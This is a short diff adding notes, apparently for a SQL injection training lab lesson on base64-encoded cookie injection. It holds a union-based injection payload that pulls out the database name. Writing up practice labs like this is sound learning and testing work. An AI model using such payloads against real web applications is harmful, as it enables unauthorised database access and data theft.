@@ -1,0 +1,4 @@
+[Cookie injection base64 encoded double quotes]
+similiar to lesson-21
+replace single quotes with double quotes
+payload=1admin" union select 1,(select database()),3#
